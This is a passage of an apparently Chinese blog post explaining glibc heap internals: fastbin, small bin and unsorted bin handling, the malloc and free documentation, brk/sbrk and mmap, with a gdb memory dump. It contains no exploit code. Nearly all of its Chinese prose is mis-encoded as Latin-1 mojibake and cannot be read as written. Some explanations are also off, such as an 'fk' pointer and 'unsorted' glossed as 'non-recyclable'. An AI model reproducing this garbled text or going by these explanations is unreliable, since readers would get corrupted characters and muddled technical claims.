†ç®¡ç†å™¨æ‰ä¼šå¯¹fastbinè¿›è¡Œåˆå¹¶</li><li>fastbinYä¸ºç®¡ç†fastbinçš„æ•°ç»„ï¼Œæ¯ä¸ªæˆå‘˜åˆ†åˆ«ç®¡ç†ä¸åŒå¤§å°çš„fastbiné“¾è¡¨ï¼Œä¸”å‡æŒ‡å‘äº†å½“å‰é“¾è¡¨çš„å°¾èŠ‚ç‚¹ï¼Œå½“å°¾èŠ‚ç‚¹è¢«åˆ†é…æ—¶ï¼Œé€šè¿‡å…¶fdæŒ‡é’ˆæŒ‡å‘å‰ä¸€ä¸ªç»“ç‚¹</li><li>å½“ç”¨æˆ·ç”³è¯·chunkå¤§å°å°äºæˆ–ç­‰äºMAX_FAST_SIZEæ—¶ï¼Œä¼˜å…ˆä»fastbinsä¸­æŸ¥æ‰¾ç›¸åº”çš„ç©ºé—²å—ï¼Œä¸”è§„åˆ™ä¸ºLIFOï¼ˆLast in, first out, åè¿›å…ˆå‡ºï¼‰<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204112.png" alt="Pasted image 20250226204112"><br>ğŸ‘‡è¿™é‡Œçš„æ¨ªå‘æ’åˆ—çš„å°±æ˜¯ main_areneï¼ˆfast binï¼‰çš„å†…å­˜åœ°å€<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204137.png" alt="Pasted image 20250226204137"><br>å‡å¦‚æ­¤æ—¶ 0x0804a000 å¤„çš„å †å—ï¼ˆå®é™…å †å—ä¸­çš„ size å­—æ®µè¦å‡å» PREV_INUSE å­—æ®µå€¼ 1ï¼Œ)å·²ç»è¢« free äº†ï¼Œé‚£ä¹ˆä»–å°±ä¼šè¢«å­˜å‚¨<strong>åœ¨è¡¨ç¤º 40 bytes çš„ fast bin çš„å†…å­˜åœ°å€é‡Œ</strong></li></ol><ul><li>æ³¨æ„ï¼š<strong>è¿™é‡ŒæŠŠæŒ‡é’ˆå’Œåœ°å€åŒºåˆ«å¼€ã€‚åœ°å€å­˜å‚¨çš„æ˜¯æŒ‡é’ˆï¼Œ64 ä½çš„æŒ‡é’ˆå  8 ä¸ªå­—èŠ‚</strong>ã€‚<br><strong>å‡è®¾æˆ‘ä»¬ç°åœ¨è¿˜æ˜¯ä»¥ 64 ä½ä¸‹çš„ malloc(10) ä¸ºä¾‹å­ã€‚</strong><br>æ ¹æ®å‰é¢é‚£ä¸ª free å‡½æ•°çš„ä¾‹å­ï¼ŒæŸ¥çœ‹ main_arena åœ°å€ä¸­çš„æŒ‡é’ˆå€¼æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ï¼Œ<strong>+0x8 åç§»å¤„æ‰æ˜¯æŒ‡å‘ malloc(10) çš„å †å—çš„æŒ‡é’ˆ</strong>ï¼ˆè¿™ä¸ªå †å—åˆ†é…åçš„ user data å®é™…å¤§å°æ˜¯ 16 å­—èŠ‚ï¼‰</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">x/2gx &amp;main_arena                           (16 bytes çš„é“¾è¡¨å¤´)</span></span><br><span class="line">0x7ffff7dd3760 &lt;main_arena&gt;:    0x0000000000000000    0x0000000000602000</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™ä¸ª 16 å­—èŠ‚çš„å †å—çš„æŒ‡é’ˆä¼šè¢«æ’å…¥å±äºä»–çš„è¿™ä¸ªé“¾è¡¨é˜Ÿåˆ—ä¸­ï¼Œä¹Ÿå°±æ˜¯å¦‚ä¸‹çš„æƒ…å†µ<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204230.png" alt="Pasted image 20250226204230"><br>æ‰€ä»¥è¿™ä¹Ÿå°±<strong>å°è¯äº†åœ¨ main_arena ä¸­åˆ†åˆ«è¡¨ç¤º 16 Bytes, 24 Bytes, 32 Bytes, â€¦ , 80 Bytes çš„å†…å­˜åœ°å€ä¸­åˆ†åˆ«å­˜å‚¨ç€å·²ç» free çš„è€Œä¸”æ»¡è¶³è¿™ä¸ªå¤§å°çš„ chunkçš„æŒ‡é’ˆã€‚</strong></p><h5 id="fast-binçš„ç‰¹æ€§"><a href="#fast-binçš„ç‰¹æ€§" class="headerlink" title="fast binçš„ç‰¹æ€§"></a>fast binçš„ç‰¹æ€§</h5><p><strong>1.ä½¿ç”¨å•é“¾è¡¨æ¥ç»´æŠ¤é‡Šæ”¾çš„å †å—</strong><br>ä¹Ÿå°±æ˜¯å’Œä¸Šå›¾ä¸€æ ·ï¼Œä»main_arena åˆ° free ç¬¬ä¸€ä¸ªå—çš„åœ°æ–¹æ˜¯é‡‡ç”¨å•é“¾è¡¨å½¢å¼è¿›è¡Œå­˜å‚¨çš„ï¼Œè‹¥è¿˜æœ‰ free æ‰çš„å †å—ï¼Œåˆ™è¿™ä¸ªå †å—çš„ fk æŒ‡é’ˆåŸŸå°±ä¼šæŒ‡é’ˆå‰ä¸€ä¸ªå †å—ã€‚<br>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ­¤æ—¶å°±æ˜¯ä¸€ä¸ªå•é“¾è¡¨ç»“æ„<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204508.png" alt="Pasted image 20250226204508"><br><strong>2.é‡‡ç”¨åè¿›å…ˆå‡ºçš„æ–¹å¼ç»´æŠ¤é“¾è¡¨ï¼ˆç±»ä¼¼äºæ ˆçš„ç»“æ„ï¼‰</strong><br>å½“ç¨‹åºéœ€è¦é‡æ–° malloc å†…å­˜å¹¶ä¸”éœ€è¦ä»fastbin ä¸­æŒ‘é€‰å †å—æ—¶ï¼Œ<strong>ä¼šé€‰æ‹©åé¢æ–°åŠ å…¥çš„å †å—æ‹¿æ¥å…ˆè¿›è¡Œå†…å­˜åˆ†é…</strong><br>å¦‚ä¸Šå›¾ï¼Œå¦‚æœç¨‹åºé‡æ–°è¯·æ±‚å’Œä¸Šé¢çš„å †å—å¤§å°ä¸€æ ·æ—¶å€™ï¼ˆmalloc)ï¼Œå †ç®¡ç†å™¨å°±ä¼šç›´æ¥ä½¿ç”¨ fast bin é‡Œçš„å †å—ã€‚<br><strong>è¿™é‡Œçš„è¯ä¹Ÿå°±æ˜¯ç›´æ¥ä½¿ç”¨ç¬¬äºŒæ¬¡é‡Šæ”¾çš„è¿™ä¸ªå †å—ï¼Œç„¶åå°†è¿™ä¸ªå †å—ä»é“¾è¡¨ä¸­ç§»é™¤ï¼Œæ¥ç€æ ¹æ®å †å—çš„ fk æŒ‡é’ˆæ‰¾åˆ°è¿™ä¸ªå †å—</strong>ï¼Œæ­¤æ—¶ main_arena å°±æŒ‡å‘äº†è¿™é‡Œã€‚ä¹Ÿå°±æ˜¯æ¢å¤åˆ°äº†ä¸Šé¢ç¬¬ä¸€ä¸ªå›¾ä¸­çš„æƒ…å†µã€‚</p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ª small chunk ï¼Œæ»¡è¶³çš„å†…å­˜ç©ºé—´æ¯” fast bin å¤§ä¸€ç‚¹ã€‚<br>å¦‚æœç¨‹åºè¯·æ±‚çš„å†…å­˜èŒƒå›´ä¸åœ¨ fast bin çš„èŒƒå›´å†…ï¼Œå°±ä¼šè€ƒè™‘small binã€‚ç®€å•ç‚¹è¯´å°±æ˜¯å¤§äº 80 Bytes å°äºæŸä¸€ä¸ªå€¼æ—¶ï¼Œå°±ä¼šé€‰æ‹©ä»–ã€‚<br><strong>æè¿°ï¼š</strong></p><ol><li>åœ¨32ä½æ“ä½œç³»ç»Ÿä¸­ï¼Œå½“ç”¨æˆ·é‡Šæ”¾çš„å †å—å¤§å°<strong>å¤§äº64Bï¼Œå°äºç­‰äº512B</strong>æ—¶ä½¿ç”¨small binè¿›è¡Œç®¡ç†</li><li>small bin ä¸ºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œä¸”ä½¿ç”¨ <strong>FIFO</strong>(First in, first out, å…ˆå…¥å…ˆå‡º)ç®—æ³•</li><li>å½“æ»¡è¶³small binæ¡ä»¶çš„chunkè¢«é‡Šæ”¾åï¼Œä¼šä¼˜å…ˆè¢«æ”¾å…¥unosrted binï¼Œåªæœ‰åœ¨ä¸€å®šæƒ…å†µä¸‹ï¼Œæ‰ä¼šè¢«åˆ†é…åˆ°small binä¸­</li><li>ç›¸é‚»çš„free chunkå°†ä¼šè¢«åˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„fee chunkï¼Œå¢åŠ å†…å­˜åˆ©ç”¨ç‡<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204717.png" alt="Pasted image 20250226204717"><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><blockquote><ol><li>å½“é‡Šæ”¾è¾ƒå°æˆ–è¾ƒå¤§çš„chunkçš„æ—¶å€™ï¼Œä¸ºäº†å¢åŠ åˆ†é…æ•ˆç‡ï¼Œç³»ç»Ÿä¼šå…ˆå°†æœ€è¿‘é‡Šæ”¾çš„chunkæ·»åŠ åˆ°unsorted binä¸­</li><li>unsorted bin ä¸ºä¸€ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå¯¹chunkçš„å¤§å°æ²¡æœ‰é™åˆ¶ï¼Œå³ä»»ä½•å¤§å°çš„chunkéƒ½å¯ä»¥æ”¾å…¥unsorted biné“¾è¡¨ä¸­</li><li>å½“ fast binã€small bin ä¸­çš„ chunk éƒ½ä¸èƒ½æ»¡è¶³ç”¨æˆ·è¯·æ±‚ chunk å¤§å°æ—¶ï¼Œå †ç®¡ç†å™¨å°±ä¼šè€ƒè™‘ä½¿ç”¨ unsorted bin ã€‚å®ƒä¼šåœ¨åˆ†é… large chunk ä¹‹å‰å¯¹å †ä¸­ç¢ç‰‡ chunk è¿›è¡Œåˆå¹¶ï¼Œä»¥ä¾¿å‡å°‘å †ä¸­çš„ç¢ç‰‡ã€‚</li></ol></blockquote></li></ol><ul><li>unsorted bin ä¸ fast bin ä¸åŒï¼Œä»–ä½¿ç”¨<strong>åŒå‘é“¾è¡¨</strong>å¯¹ chunk è¿›è¡Œè¿æ¥</li><li>unsorted çš„å­—é¢æ„æ€å°±æ˜¯â€ä¸å¯å›æ”¶â€çš„æ„æ€ï¼Œå¯ä»¥çœ‹ä½œå°†ä¸å¯å›æ”¶çš„åƒåœ¾ï¼ˆä¸æ»¡è¶³èƒ½å¤Ÿè¿›è¡Œå†…å­˜åˆ†é…çš„å †å—ï¼‰éƒ½æ”¾åˆ°è¿™ä¸ªâ€åƒåœ¾æ¡¶â€ä¸­ã€‚</li></ul><h2 id="æ·±å…¥ç†è§£å †çš„æ¦‚å¿µ"><a href="#æ·±å…¥ç†è§£å †çš„æ¦‚å¿µ" class="headerlink" title="æ·±å…¥ç†è§£å †çš„æ¦‚å¿µ"></a>æ·±å…¥ç†è§£å †çš„æ¦‚å¿µ</h2><p>åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå †å¯ä»¥æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜ã€‚<strong>å †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œå®ƒç”±ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘å¢é•¿</strong>ã€‚æˆ‘ä»¬ä¸€èˆ¬ç§°ç®¡ç†å †çš„é‚£éƒ¨åˆ†ç¨‹åºä¸ºå †ç®¡ç†å™¨ã€‚<br><strong>å †ç®¡ç†å™¨å¤„äºç”¨æˆ·ç¨‹åºä¸å†…æ ¸ä¸­é—´</strong>ï¼Œä¸»è¦åšä»¥ä¸‹å·¥ä½œï¼š  </p><ol><li>å“åº”ç”¨æˆ·çš„ç”³è¯·å†…å­˜è¯·æ±‚ï¼Œå‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œç„¶åå°†å…¶è¿”å›ç»™ç”¨æˆ·ç¨‹åºã€‚åŒæ—¶ï¼Œ<em>ä¸ºäº†ä¿æŒå†…å­˜ç®¡ç†çš„é«˜æ•ˆæ€§ï¼Œå†…æ ¸ä¸€èˆ¬éƒ½ä¼šé¢„å…ˆåˆ†é…å¾ˆå¤§çš„ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œç„¶åè®©å †ç®¡ç†å™¨é€šè¿‡æŸç§ç®—æ³•ç®¡ç†è¿™å—å†…å­˜ã€‚åªæœ‰å½“å‡ºç°äº†å †ç©ºé—´ä¸è¶³çš„æƒ…å†µï¼Œå †ç®¡ç†å™¨æ‰ä¼šå†æ¬¡ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’</em>ã€‚  </li><li>ç®¡ç†ç”¨æˆ·æ‰€é‡Šæ”¾çš„å†…å­˜ã€‚<em>ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·é‡Šæ”¾çš„å†…å­˜å¹¶ä¸æ˜¯ç›´æ¥è¿”è¿˜ç»™æ“ä½œç³»ç»Ÿçš„ï¼Œè€Œæ˜¯ç”±å †ç®¡ç†å™¨è¿›è¡Œç®¡ç†ã€‚è¿™äº›é‡Šæ”¾çš„å†…å­˜å¯ä»¥æ¥å“åº”ç”¨æˆ·æ–°ç”³è¯·çš„å†…å­˜çš„è¯·æ±‚</em>ã€‚<br>Linux ä¸­æ—©æœŸçš„å †åˆ†é…ä¸å›æ”¶ç”± Doug Lea å®ç°ï¼Œä½†å®ƒåœ¨å¹¶è¡Œå¤„ç†å¤šä¸ªçº¿ç¨‹æ—¶ï¼Œä¼šå…±äº«è¿›ç¨‹çš„å †å†…å­˜ç©ºé—´ã€‚å› æ­¤ï¼Œä¸ºäº†å®‰å…¨æ€§ï¼Œä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨å †æ—¶ï¼Œä¼šè¿›è¡ŒåŠ é”ã€‚ç„¶è€Œï¼Œä¸æ­¤åŒæ—¶ï¼ŒåŠ é”ä¼šå¯¼è‡´å…¶å®ƒçº¿ç¨‹æ— æ³•ä½¿ç”¨å †ï¼Œé™ä½äº†å†…å­˜åˆ†é…å’Œå›æ”¶çš„é«˜æ•ˆæ€§ã€‚åŒæ—¶ï¼Œå¦‚æœåœ¨å¤šçº¿ç¨‹ä½¿ç”¨æ—¶ï¼Œæ²¡èƒ½æ­£ç¡®æ§åˆ¶ï¼Œä¹Ÿå¯èƒ½å¼•èµ·å†…å­˜åˆ†é…å’Œå›æ”¶çš„æ­£ç¡®æ€§ã€‚Wolfram Gloger åœ¨ Doug Lea çš„åŸºç¡€ä¸Šè¿›è¡Œæ”¹è¿›ä½¿å…¶å¯ä»¥æ”¯æŒå¤šçº¿ç¨‹ï¼Œè¿™ä¸ªå †åˆ†é…å™¨å°±æ˜¯ ptmalloc ã€‚åœ¨ glibc-2.3.x. ä¹‹åï¼Œglibc ä¸­é›†æˆäº†ptmalloc2ã€‚<br>ç›®å‰ Linux æ ‡å‡†å‘è¡Œç‰ˆä¸­ä½¿ç”¨çš„å †åˆ†é…å™¨æ˜¯ glibc ä¸­çš„å †åˆ†é…å™¨ï¼šptmalloc2ã€‚<strong>ptmalloc2 ä¸»è¦æ˜¯é€šè¿‡ malloc/free å‡½æ•°æ¥åˆ†é…å’Œé‡Šæ”¾å†…å­˜å—ã€‚</strong><br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å†…å­˜åˆ†é…ä¸ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼ŒLinuxæœ‰è¿™æ ·çš„ä¸€ä¸ªåŸºæœ¬å†…å­˜ç®¡ç†æ€æƒ³ï¼Œ<strong>åªæœ‰å½“çœŸæ­£è®¿é—®ä¸€ä¸ªåœ°å€çš„æ—¶å€™ï¼Œç³»ç»Ÿæ‰ä¼šå»ºç«‹è™šæ‹Ÿé¡µé¢ä¸ç‰©ç†é¡µé¢çš„æ˜ å°„å…³ç³»ã€‚ æ‰€ä»¥è™½ç„¶æ“ä½œç³»ç»Ÿå·²ç»ç»™ç¨‹åºåˆ†é…äº†å¾ˆå¤§çš„ä¸€å—å†…å­˜ï¼Œä½†æ˜¯è¿™å—å†…å­˜å…¶å®åªæ˜¯è™šæ‹Ÿå†…å­˜ã€‚åªæœ‰å½“ç”¨æˆ·ä½¿ç”¨åˆ°ç›¸åº”çš„å†…å­˜æ—¶ï¼Œç³»ç»Ÿæ‰ä¼šçœŸæ­£åˆ†é…ç‰©ç†é¡µé¢ç»™ç”¨æˆ·ä½¿ç”¨ã€‚</strong></li></ol><h2 id="å †çš„åŸºæœ¬æ“ä½œ"><a href="#å †çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="å †çš„åŸºæœ¬æ“ä½œ"></a>å †çš„åŸºæœ¬æ“ä½œ</h2><p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦ä»‹ç»  </p><ul><li>åŸºæœ¬çš„å †æ“ä½œï¼ŒåŒ…æ‹¬å †çš„åˆ†é…ï¼Œå›æ”¶ï¼Œå †åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨  </li><li>ä»‹ç»å †ç›®å‰çš„å¤šçº¿ç¨‹æ”¯æŒã€‚  <h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3>åœ¨ glibc çš„<a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L448">malloc.h</a>ä¸­ï¼Œmalloc çš„è¯´æ˜å¦‚ä¸‹ï¼š  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>å¯ä»¥çœ‹å‡ºï¼Œmalloc å‡½æ•°è¿”å›å¯¹åº”å¤§å°å­—èŠ‚çš„å†…å­˜å—çš„æŒ‡é’ˆã€‚æ­¤å¤–ï¼Œè¯¥å‡½æ•°è¿˜å¯¹ä¸€äº›å¼‚å¸¸æƒ…å†µè¿›è¡Œäº†å¤„ç†  </li><li>å½“ n=0 æ—¶ï¼Œ<strong>è¿”å›å½“å‰ç³»ç»Ÿå…è®¸çš„å †çš„æœ€å°å†…å­˜å—</strong>ã€‚  </li><li>å½“ n ä¸ºè´Ÿæ•°æ—¶ï¼Œç”±äºåœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸Šï¼Œ<strong>size_t æ˜¯æ— ç¬¦å·æ•°ï¼ˆè¿™ä¸€ç‚¹éå¸¸é‡è¦ï¼‰</strong>ï¼Œæ‰€ä»¥ç¨‹åºå°±ä¼šç”³è¯·å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œä½†é€šå¸¸æ¥è¯´éƒ½ä¼šå¤±è´¥ï¼Œå› ä¸ºç³»ç»Ÿæ²¡æœ‰é‚£ä¹ˆå¤šçš„å†…å­˜å¯ä»¥åˆ†é…ã€‚  <h3 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h3>åœ¨ glibc çš„ <a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L465">malloc.h</a> ä¸­ï¼Œfree çš„è¯´æ˜å¦‚ä¸‹  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  free(void* p)</span></span><br><span class="line"><span class="comment">  Releases the chunk of memory pointed to by p, that had been previously</span></span><br><span class="line"><span class="comment">  allocated using malloc or a related routine such as realloc.</span></span><br><span class="line"><span class="comment">  It has no effect if p is null. It can have arbitrary (i.e., bad!)</span></span><br><span class="line"><span class="comment">  effects if p has already been freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless disabled (using mallopt), freeing very large spaces will</span></span><br><span class="line"><span class="comment">  when possible, automatically trigger operations that give</span></span><br><span class="line"><span class="comment">  back unused memory to the system, thus reducing program footprint.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>å¯ä»¥çœ‹å‡ºï¼Œfree å‡½æ•°ä¼šé‡Šæ”¾ç”± p æ‰€æŒ‡å‘çš„å†…å­˜å—ã€‚<strong>è¿™ä¸ªå†…å­˜å—æœ‰å¯èƒ½æ˜¯é€šè¿‡ malloc å‡½æ•°å¾—åˆ°çš„ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯é€šè¿‡ç›¸å…³çš„å‡½æ•° realloc å¾—åˆ°çš„ã€‚</strong><br>æ­¤å¤–ï¼Œè¯¥å‡½æ•°ä¹ŸåŒæ ·å¯¹å¼‚å¸¸æƒ…å†µè¿›è¡Œäº†å¤„ç†  </li><li><strong>å½“ p ä¸ºç©ºæŒ‡é’ˆæ—¶ï¼Œå‡½æ•°ä¸æ‰§è¡Œä»»ä½•æ“ä½œ</strong>ã€‚  </li><li>å½“ p å·²ç»è¢«é‡Šæ”¾ä¹‹åï¼Œ<strong>å†æ¬¡é‡Šæ”¾ä¼šå‡ºç°ä¹±ä¸ƒå…«ç³Ÿçš„æ•ˆæœ</strong>ï¼Œè¿™å…¶å®å°±æ˜¯ <code>double free</code>ã€‚  </li><li><strong>é™¤äº†è¢«ç¦ç”¨ (mallopt) çš„æƒ…å†µä¸‹ï¼Œå½“é‡Šæ”¾å¾ˆå¤§çš„å†…å­˜ç©ºé—´æ—¶ï¼Œç¨‹åºä¼šå°†è¿™äº›å†…å­˜ç©ºé—´è¿˜ç»™ç³»ç»Ÿï¼Œä»¥ä¾¿äºå‡å°ç¨‹åºæ‰€ä½¿ç”¨çš„å†…å­˜ç©ºé—´</strong>ã€‚  </li></ul><h2 id="å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨"><a href="#å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨"></a>å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨</h2><p>åœ¨å‰é¢æåˆ°çš„å‡½æ•°ä¸­ï¼Œæ— è®ºæ˜¯ malloc å‡½æ•°è¿˜æ˜¯ free å‡½æ•°ï¼Œæˆ‘ä»¬åŠ¨æ€ç”³è¯·å’Œé‡Šæ”¾å†…å­˜æ—¶ï¼Œéƒ½ç»å¸¸ä¼šä½¿ç”¨ï¼Œä½†æ˜¯å®ƒä»¬å¹¶ä¸æ˜¯çœŸæ­£ä¸ç³»ç»Ÿäº¤äº’çš„å‡½æ•°ã€‚è¿™äº›å‡½æ•°èƒŒåçš„ç³»ç»Ÿè°ƒç”¨ä¸»è¦æ˜¯ <a href="http://man7.org/linux/man-pages/man2/sbrk.2.html">(s)brk</a> å‡½æ•°ä»¥åŠ <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap, munmap</a> å‡½æ•°ã€‚<br>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ä¸»è¦è€ƒè™‘å¯¹å †è¿›è¡Œç”³è¯·å†…å­˜å—çš„æ“ä½œã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599128488052-ad18a93d-0e6f-4713-b517-c672eed6cd56.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_14%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fformat%2Cwebp%2Fresize%2Cw_480%2Climit_0" alt></p><h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>å¯¹äºå †çš„æ“ä½œï¼Œæ“ä½œç³»ç»Ÿæä¾›äº† brk å‡½æ•°ï¼Œglibc åº“æä¾›äº† sbrk å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¢åŠ  <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">brk</a><br>brk å’Œ sbrkçš„ä½œç”¨ï¼šmallocçš„åº•å±‚å®ç°ï¼Œç”¨äºåˆ†é…å¼€è¾Ÿå†…å­˜ï¼Œä½†æ˜¯brkæ˜¯ç³»ç»Ÿè°ƒç”¨ è€Œsbrkä¸æ˜¯  ï¼Œsbrkè°ƒç”¨äº†brk<br>(program break location, the program break is the address of the first location beyond the current end of the data region <a href="https://en.wikipedia.org/wiki/Sbrk\">https://en.wikipedia.org/wiki/Sbrk)çš„å¤§å°æ¥å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜</a>%E7%9A%84%E5%A4%A7%E5%B0%8F%E6%9D%A5%E5%90%91%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98)ã€‚  </p><blockquote><p>å…³äºprogram break ï¼šç¨‹åºé—´æ–­ç‚¹</p></blockquote><p><strong>åˆå§‹æ—¶ï¼Œå †çš„èµ·å§‹åœ°å€ <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">start_brk</a> ä»¥åŠå †çš„å½“å‰æœ«å°¾ <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">brk</a> æŒ‡å‘åŒä¸€åœ°å€</strong>ã€‚æ ¹æ®æ˜¯å¦å¼€å¯ASLRï¼Œä¸¤è€…çš„å…·ä½“ä½ç½®ä¼šæœ‰æ‰€ä¸åŒ  </p><ul><li>ä¸å¼€å¯ ASLR ä¿æŠ¤æ—¶ï¼Œstart_brk ä»¥åŠ brk ä¼šæŒ‡å‘ data/bss æ®µçš„ç»“å°¾ã€‚  </li><li>å¼€å¯ ASLR ä¿æŠ¤æ—¶ï¼Œstart_brk ä»¥åŠ brk ä¹Ÿä¼šæŒ‡å‘åŒä¸€ä½ç½®ï¼Œåªæ˜¯è¿™ä¸ªä½ç½®æ˜¯åœ¨ data/bss æ®µç»“å°¾åçš„éšæœºåç§»å¤„ã€‚<br>å…·ä½“æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599129188134-82bd81ed-579a-4c91-9d4f-5b95d0eb6fb4.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_23%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fformat%2Cwebp%2Fresize%2Cw_819%2Climit_0" alt><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><strong>mallocä¼šä½¿ç”¨mmapæ¥åˆ›å»ºç‹¬ç«‹çš„åŒ¿åæ˜ å°„æ®µã€‚åŒ¿åæ˜ å°„çš„ç›®çš„ä¸»è¦æ˜¯å¯ä»¥ç”³è¯·ä»¥oå¡«å……çš„å†…å­˜ï¼Œå¹¶ä¸”è¿™å—å†…å­˜ä»…è¢«è°ƒç”¨è¿›ç¨‹æ‰€ä½¿ç”¨ã€‚</strong><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213113.png" alt="Pasted image 20250226213113"></li></ul><h4 id="åœ¨æ‰§è¡Œmmapä¹‹å‰"><a href="#åœ¨æ‰§è¡Œmmapä¹‹å‰" class="headerlink" title="åœ¨æ‰§è¡Œmmapä¹‹å‰"></a>åœ¨æ‰§è¡Œmmapä¹‹å‰</h4><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213125.png" alt="Pasted image 20250226213125"></p><h4 id="mmapå"><a href="#mmapå" class="headerlink" title="mmapå"></a>mmapå</h4><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213144.png" alt="Pasted image 20250226213144"></p><h4 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a>munmap</h4><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213155.png" alt="Pasted image 20250226213155"></p><h3 id="å¤šçº¿ç¨‹æ”¯æŒ"><a href="#å¤šçº¿ç¨‹æ”¯æŒ" class="headerlink" 